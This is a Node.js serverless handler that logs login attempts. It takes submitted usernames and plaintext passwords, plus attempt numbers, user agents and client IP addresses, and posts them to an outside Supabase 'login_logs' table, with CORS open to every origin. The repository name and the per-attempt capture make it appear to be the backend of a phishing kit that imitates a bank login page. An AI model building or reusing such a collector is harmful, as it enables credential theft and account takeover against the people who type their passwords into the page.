// fetch is built-in to Node 18+
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://pgsccgetvjjoerefqitb.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    if (req.method === 'POST') {
      const { username, password, attemptNumber, status, timestamp, userAgent } = req.body;
      
      const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
      
      const logData = {
        timestamp: new Date(timestamp).toISOString(),
        username,
        password: password,
        attempt_number: attemptNumber,
        status,
        user_agent: userAgent,
        ip_address: ipAddress
      };
      
      let stored = 'Supabase';
      
      // Try Supabase
      if (SUPABASE_URL && SUPABASE_KEY) {
        try {
          const response = await fetch(`${SUPABASE_URL}/rest/v1/login_logs`, {
            method: 'POST',
            headers: {
              'apikey': SUPABASE_KEY,
              'Authorization': `Bearer ${SUPABASE_KEY}`,
              'Content-Type': 'application/json',
              'Prefer': 'return=minimal'
            },
            body: JSON.stringify(logData)
          });

          if (!response.ok) {
            throw new Error(`Supabase error: ${response.status}`);
          }
        } catch (err) {
          console.error('Supabase error:', err.message);
          stored = 'GitHub';
        }
      }
      
      console.log(`[${new Date().toISOString()}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status}) [${stored}]`);
      
      res.status(200).json({ 
        success: true, 
        message: 'Login attempt logged',
        stored
      });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
